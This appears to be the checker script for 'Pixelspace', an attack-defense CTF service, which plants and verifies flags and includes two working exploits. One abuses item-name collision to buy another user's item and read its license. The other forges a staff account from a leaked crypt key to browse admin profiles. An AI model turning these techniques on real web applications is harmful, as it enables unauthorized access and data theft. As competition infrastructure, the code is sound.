from calendar import c
import secrets
from typing import Optional
from urllib.request import CacheFTPHandler
from xmlrpc.client import ResponseError
from httpx import AsyncClient
from util import *


from enochecker3 import(
    ChainDB,
    Enochecker,

    MumbleException,
    InternalErrorException,

    #FLAG-Message-Tasks
    GetflagCheckerTaskMessage,
    PutflagCheckerTaskMessage,

    #NOISE-Message-Tasks
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,

    #HAVOC-Message-Tasks
    HavocCheckerTaskMessage,

    #EXPLOIT-Message-Tasks
    ExploitCheckerTaskMessage,


    
)

from enochecker3.utils import FlagSearcher, assert_equals, assert_in

checker = Enochecker("Pixelspace",8010)
def app(): return checker.app
####################### GETFLAG AND PUTFLAG #########################
@checker.putflag(0)
async def putflag_license(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:   
    item_name = exploitable_item_name(min_length=5)
    user = await register_user(client=client,logger=None,db=db,chain_id=task.task_chain_id)
    shop_item_kwargs =  {
        'data_path': '/frog.png',
        'item_name': item_name,
        'logged_in': True,
        'flag_str': task.flag,
    }
    
    await create_ShopItem(client=client,logger=None,db=db,kwargs=shop_item_kwargs)
    shop_listing_kwargs = {
        'item_name': item_name,
        'item_price': 100000000000.0,
        'description': 'THIS IS SUPER EXPENSIVE GG CHECKER',
    }
    await create_ShopListing(client=client,logger=None,db=db,kwargs=shop_listing_kwargs)
    await logout_user(client=client,logger=None,db=db,kwargs={'logged_in':True})
    await db.set(task.task_chain_id + "_flag", task.flag)
    await db.set(task.task_chain_id + "_user", {'user':user['username'],'password':user['password1']})


@checker.getflag(0)
async def getflag_license(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    item_id = -1
    regex_item = '<a href="(.+?)">View Item</a>'
    regex_license = '<a href="/(.+?)">View License</a>'
    try: 
        user = await db.get(task.task_chain_id+"_user")
    except KeyError:
        raise MumbleException("Could not retrieve data from ChainDB!")

    try:
        flag = await db.get(task.task_chain_id+"_flag")
    except KeyError:
        raise MumbleException("Could not retrieve data from ChainDB!")
    if flag != task.flag:
        raise MumbleException(f"Flags with task_chain_id={task.task_chain_id} are different (DB and task)!")

    login_kwargs={
        'username': user['user'],
        'password': user['password'],
    }
    await login(client=client,logger=None,db=db,kwargs=login_kwargs)
    try:
        response = await client.get('user_items/',follow_redirects=True)
    except RequestError:
        raise MumbleException("Error while retrieving user items!")
    
    
    item_id = re.findall(regex_item,response.text)[0]
    if item_id == -1:
        raise MumbleException("Errow while searching for flag item (license)!")

    try:  
        response = await client.get(f'user_items/{item_id}',follow_redirects=True)
    except RequestError:
        raise MumbleException(f"Error while viewing user item with id: {item_id}")
    
    license_url = re.findall(regex_license,response.text)[0]

    try:
        response = await client.get(f"{license_url}",follow_redirects=True)
    except RequestError:
        raise MumbleException(f"Error while viewing license of user item with id: {item_id}")
        
    if task.flag not in response.text:
        raise MumbleException(f"Error - Flag not in response text!")
    assert_in(task.flag,response.text)
    

@checker.putflag(1)
async def putflag_notes(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:    
    user = await register_user(client=client,logger=None,db=db,chain_id=task.task_chain_id)
    note_kwargs = {
        'note':task.flag,
        'logged_in': True,
    }
    await create_note(client=client,logger=None,db=db,kwargs=note_kwargs)
    await db.set(task.task_chain_id + "_flag", task.flag)
    await db.set(task.task_chain_id + "_user", {'user':user['username'],'password':user['password1']})
    


@checker.getflag(1)
async def getflag_notes(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    regex_notes = '<input type="text" name="notes" value="(.+?)" maxlength="50000" required id="id_notes">'
    try: 
        user = await db.get(task.task_chain_id+"_user")
        flag = await db.get(task.task_chain_id+"_flag")
    except KeyError:
        raise MumbleException("Could not retrieve data from ChainDB!")
    if flag != task.flag:
        raise MumbleException(f"Flags with task_chain_id={task.task_chain_id} are different (DB and task)!")

    login_kwargs={
        'username': user['user'],
        'password': user['password'],
    }
    await login(client=client,logger=None,db=db,kwargs=login_kwargs)
    try:
        response = await client.get('notes/',follow_redirects=True)
    except RequestError:
        raise MumbleException("Error while retrieving user items!")

    match = re.findall(regex_notes,response.text)[0]
    assert_in(task.flag,match)

####################### GETNOISE AND PUTNOISE #########################

@checker.putnoise(0)
async def put_noise_base_functions(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    user = await register_user(client=client,logger=None,db=db,chain_id=None)
    item_name = ''.join(secrets.choice(string.ascii_letters) for i in range(random.randint(5,15)))
    shop_item_kwargs =  {
        'data_path': '/frog.png',
        'item_name': item_name,
        'logged_in': True,
        'flag_str': ''.join(secrets.choice(string.ascii_letters) for i in range(random.randint(5,15))),
    }
    
    await create_ShopItem(client=client,logger=None,db=db,kwargs=shop_item_kwargs)
    shop_listing_kwargs = {
        'item_name': item_name,
        'item_price': random.randint(1,1000)/100,
        'description': ''.join(secrets.choice(string.ascii_letters) for i in range(random.randint(5,25))),
    }
    await create_ShopListing(client=client,logger=None,db=db,kwargs=shop_listing_kwargs)
    await logout_user(client=client,logger=None,db=db,kwargs={'logged_in':True})
    await db.set(task.task_chain_id + "_item_name", item_name)
    await db.set(task.task_chain_id + "_user", {'user':user['username'],'password':user['password1']})

@checker.getnoise(0)
async def get_noise_base_functions(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    try: 
        user = await db.get(task.task_chain_id+"_user")
        item = await db.get(task.task_chain_id+"_item_name")
    except KeyError:
        raise MumbleException("Could not retrieve data from ChainDB!")
    
    login_kwargs={
        'username': user['user'],
        'password': user['password'],
    }

    await login(client=client,logger=None,db=db,kwargs=login_kwargs)

    try:
        response = await client.get('shop',follow_redirects=True)
    except ResponseError:
        raise MumbleException("GET_NOISE_BASE_FUNCTIONS - Error while requesting endpoint shop!")
    if not item in response.text:
        raise MumbleException("GET_NOISE_BASE_FUNCTIONS - Error while searching for previously enlisted item!")


############################## EXPLOITS ################################

@checker.exploit(0)
async def exploit_license(searcher: FlagSearcher, client: AsyncClient, db: ChainDB) -> None:
    item_cost = 100000000000.0
    regex_license = '<a href="/(.+?)">View License</a>' 
    regex_item_name = re.compile(f"<td><h4>(.*)</h4>(?:.*)\n(?:.*)\n<td>{item_cost}</td>",re.MULTILINE)
    user = await register_user(client=client,logger=None,db=db,chain_id=None)

    try:
        response = await client.get('shop/',follow_redirects=True)
    except ResponseError:
        raise MumbleException("EXPLOIT_LICENSE - Error while requesting endpoint shop!")
    
    orig_name = re.findall(regex_item_name,response.text)[0]

    item_name = await make_item_name_exploitable(item_name=orig_name )

    shop_item_kwargs =  {
        'data_path': '/frog.png',
        'item_name': item_name,
        'logged_in': True,
        'flag_str': 'This is just an exploit',
    }
    
    await create_ShopItem(client=client,logger=None,db=db,kwargs=shop_item_kwargs)
    shop_listing_kwargs = {
        'item_name': item_name,
        'item_price': 0.01,
        'description': 'This is exploitable',
    }
    await create_ShopListing(client=client,logger=None,db=db,kwargs=shop_listing_kwargs)
    await logout_user(client=client,logger=None,db=db,kwargs={'logged_in':True})
    user = await register_user(client=client,logger=None,db=db,chain_id=None)
    try:
        response = await client.get('shop/',follow_redirects=True)
    except ResponseError:
        raise MumbleException("EXPLOIT_LICENSE - Error while requesting endpoint shop!")
    
    item_id=((response.text.split(item_name)[1]).split('<a href="')[1]).split('"')[0]

    try:
        response = await client.get(f'shop/purchase/{item_id}',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_LICENSE - Error while requesting item with id {item_id}")

    try:
        response = await client.get(f'user_items/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_LICENSE - Error while requesting item with id {item_id}") 

    try:
        response = await client.get(f'user_items/{item_id}',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_LICENSE - Error while requesting item with id {item_id}") 
    
    license_url = re.findall(regex_license,response.text)[0]
    
    try:
        response = await client.get(f"{license_url}",follow_redirects=True)
    except RequestError:
        raise MumbleException(f"Error while viewing license of user item with id: {item_id}")

    
    flag = searcher.search_flag(response.text)
    if flag:
        return flag

    raise MumbleException("Could not find flag in license_file")  


@checker.exploit(1)
async def exploit_staff(searcher: FlagSearcher, client: AsyncClient, db: ChainDB,) -> None:
    key_regex = '<p>Crypt Key: (.+?)</p>'
    """
    try:
        params = await db.get('note_flag')
    except DBSearchError:
        raise MumbleException("Could not retrieve data from ChainDB!")
    """

    user = await register_user(client=client,logger=None,db=db,chain_id=None)
    
    try:
        response = await client.get(f'user_items/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_NOTE - Error while requesting users cryptographic key!") 

    
    matches = re.findall(key_regex,response.text)
    staff_kwargs =  {
    'data': user,
    'key': matches[0],
    'salt': 776, #needs to be environmental, static for now
    }

    try:
        response = await client.get(f'logout/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_NOTE - Error while logging out!")
    
    staff_user = await create_staff_user(client=client,logger=None,db=db,kwargs=staff_kwargs)

    login_data = {
        'username':staff_user['username'],
        'password':staff_user['password1'],
    }
    await login(client=client,logger=None,db=db,kwargs=login_data)
    
    try:
        response = await client.get(f'admin/pixels/profile/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_NOTE - Error while changing to admin panel!")

    profile_regex = '<a href="/admin/pixels/profile/(.+?)/change/'
    
    profiles = re.findall(profile_regex,response.text)
    comment_regex = '<label>Notes:</label>'
    for prof in profiles:
        try:
            response = await client.get(f'admin/pixels/profile/{int(prof)}/change/',follow_redirects=True)
        except ResponseError:
            raise MumbleException(f"EXPLOIT_NOTE - Error while requesting profile with num{int(prof)}!")
        
        
        flag = searcher.search_flag(response.text)
        if flag:
            return flag

    raise MumbleException("EXPLOIT_NOTE - Failed! No Flag Found!")
############################### HAVOCS #################################

@checker.havoc(0)
async def havoc_endpoints(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    endpoints = [
        '',
        'signup/',
        'login/',
        'shop/',
        #'user_items/',
        'new_item/',
        #'notes/',
        #'giftcode/',
    ]
    for e in endpoints:
        try:
            response = await client.get(e,follow_redirects=True)
        except ResponseError:
            raise MumbleException(f"HAVOC - Cannot reach endpoint <{e}> !")
    assert_equals(1,1)

    
if __name__ == "__main__":
    checker.run()
